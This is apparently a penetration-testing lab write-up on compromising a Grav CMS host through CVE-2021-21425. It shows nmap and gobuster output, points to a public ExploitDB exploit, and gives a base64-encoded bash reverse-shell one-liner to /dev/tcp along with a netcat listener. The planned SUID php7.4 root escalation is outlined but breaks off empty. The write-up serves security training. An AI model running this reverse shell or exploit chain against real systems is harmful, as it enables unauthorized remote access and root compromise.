
# Introduction

This lab exploits an unauthenticated arbitrary YAML write/update vulnerability in Grav CMS to achieve Remote Code Execution (RCE). Attackers escalate privileges by leveraging a SUID-enabled php7.4 binary, allowing command execution as root. 

# Objective

- Enumerate open ports and identify Grav CMS running on port 80.
- Exploit the YAML write vulnerability (CVE-2021-21425) to achieve Remote Code Execution and gain a shell as www-data.
- Enumerate SUID binaries and identify /usr/bin/php7.4 as a potential privilege escalation vector.
- Use pcntl_exec() with the SUID-enabled PHP binary to spawn a root shell.
- Verify root-level access and explore the compromised system.


# Information Gathering 

Nmap Scan Results:

tarting Nmap 7.99 ( https://nmap.org ) at 2026-09-17 15:55 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
Initiating Ping Scan at 15:55
Scanning 192.168.146.12 [4 ports]
Completed Ping Scan at 15:55, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:55
Completed Parallel DNS resolution of 1 host. at 15:55, 0.50s elapsed
Initiating SYN Stealth Scan at 15:55
Scanning 192.168.146.12 [65535 ports]
Discovered open port 22/tcp on 192.168.146.12
Discovered open port 80/tcp on 192.168.146.12
SYN Stealth Scan Timing: About 47.97% done; ETC: 15:56 (0:00:34 remaining)
Completed SYN Stealth Scan at 15:56, 49.24s elapsed (65535 total ports)
Initiating Service scan at 15:56
Scanning 2 services on 192.168.146.12
Completed Service scan at 15:56, 6.14s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.146.12.
Initiating NSE at 15:56
Completed NSE at 15:56, 2.47s elapsed
Initiating NSE at 15:56
Completed NSE at 15:56, 0.21s elapsed
Initiating NSE at 15:56
Completed NSE at 15:56, 0.00s elapsed
Nmap scan report for 192.168.146.12
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Available ports ==22,80==

Gobuster results:

admin                (Status: 200) [Size: 15508]
home                 (Status: 200) [Size: 14014]
login                (Status: 200) [Size: 13967]
images               (Status: 301) [Size: 328] [--> http://192.168.146.12/grav-admin/images/]
backup               (Status: 301) [Size: 328] [--> http://192.168.146.12/grav-admin/backup/]
assets               (Status: 301) [Size: 328] [--> http://192.168.146.12/grav-admin/assets/]
user                 (Status: 301) [Size: 326] [--> http://192.168.146.12/grav-admin/user/]
cache                (Status: 301) [Size: 327] [--> http://192.168.146.12/grav-admin/cache/]
system               (Status: 301) [Size: 328] [--> http://192.168.146.12/grav-admin/system/]


There are multiple subdomains available within the active target IP, but none are available for access without a direct login.

We can try researching known exploits to gain a foothold on the machine.

# Service Enumeration 

On ExploitDB we can find a validated exploit for arbitrary YAML write/update exploits that will allow us to gain direct access to the target IP. 

exploitDB link -> https://www.exploit-db.com/exploits/49973

In order for the exploit to run properly, we need to input the correct value for the target IP into the code and generate a base64 payload for the reverse shell:

	echo -ne "bash -i >& /dev/tcp/192.XXX.XXX.XXX/9001 0>&1" | base64 -w0

When running the exploit we set up a netcat listener to catch the reverse shell as we wait for the inputted command to run:

		nc -lvnp 9001

With success, we get a remore shell and are logged in as the user, "www-data"

# Privilege Escalation

















